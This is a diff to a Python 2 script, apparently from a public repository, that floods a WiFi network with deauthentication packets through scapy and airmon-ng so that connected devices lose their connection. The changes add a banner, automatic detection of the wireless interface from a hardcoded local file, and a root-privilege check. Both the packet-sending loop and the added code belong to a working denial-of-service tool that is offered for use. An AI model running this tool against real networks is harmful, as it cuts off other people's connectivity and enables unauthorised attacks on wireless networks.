@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 """
 Sends deauth packets to a wifi network which results network outage for connected devices.
 """
@@ -7,10 +7,19 @@ __license__ = "Apache 2.0"
 __version__ = "2.0"
 __maintainer__ = "Veerendra Kakumanu"
 
+print "\n+---------------------------------------------------+"
+print "|Deauth v2.1                        		    |"
+print "|Coded by Veerendra                 		    |"
+print "|Blog: www.networkhop.wordpress.com 		    |"
+print "|https://github.com/veerendra2/wifi-deauth-attack   |"
+print "+---------------------------------------------------+\n\n"
+
 import os
 import threading
 import sys
 import re
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 try:
     import scapy.all
@@ -18,6 +27,8 @@ except:
     print "\n'scapy' module not found. Installing..."
     os.system("sudo apt-get install python-scapy -y")
     import scapy.all
+
+scapy.all.conf.verbose = False
 
 class airmon(object):
     def __new__(cls, *args,**kwargs):
@@ -28,14 +39,29 @@ class airmon(object):
                     print "Found airmon-ng interface..",line.split(":")[0].strip()
                     mon_interface.append(line.split(":")[0].strip())
         if not mon_interface:
-            print "Starting monitoring interface on the wlan0..."
-            if os.system("airmon-ng start wlan0")!=0:
+            iface=findIface()
+            print "Starting monitoring interface on '{}'...".format(iface)
+            if os.system("airmon-ng start {}".format(iface))!=0:
                 print "\nairmon-ng not found. Please install aircrack-ng. RUN 'sudo apt-get install aircrack-ng -y'"
                 raise SystemExit() #Instance creation Aborted!
             mon_interface.append("mon0")
         new_instance=object.__new__(cls,*args,**kwargs)
         setattr(new_instance, "mon_interfaces",mon_interface)
         return new_instance #returns the instance, if there is mon0 interface
+
+def findIface():
+    iface=None
+    wireless_file="/home/n42/Desktop/wireless"
+    if os.path.exists(wireless_file):
+        with open(wireless_file,'r') as f:
+            for line in f.readlines():
+                if not re.search(r'Inter-',line) and not re.search(r'face',line) and line:
+                    iface=line.split(":")[0]
+    if iface:
+        return iface.strip()
+    else:
+        iface=raw_input("Wireless interface not found.\nPlease specify wireless interface> ")
+        return iface
 
 def spinner():
     while True:
@@ -86,6 +112,10 @@ class Deauth(threading.Thread):
             scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2)
 
 if __name__=='__main__':
+    if not os.geteuid() == 0:
+        print "[ERROR]".ljust(8," "),"Script must run with 'sudo'"
+        print "Usage: sudo python deauth.py [MAC or all]"
+        exit()
     try:
         input=os.environ["DEAUTH"] #Starting with Environmental variable `export DEAUTH=<MAC>`
         if re.search(r'(?:[0-9a-fA-F]:?){12}',os.environ["DEAUTH"]):
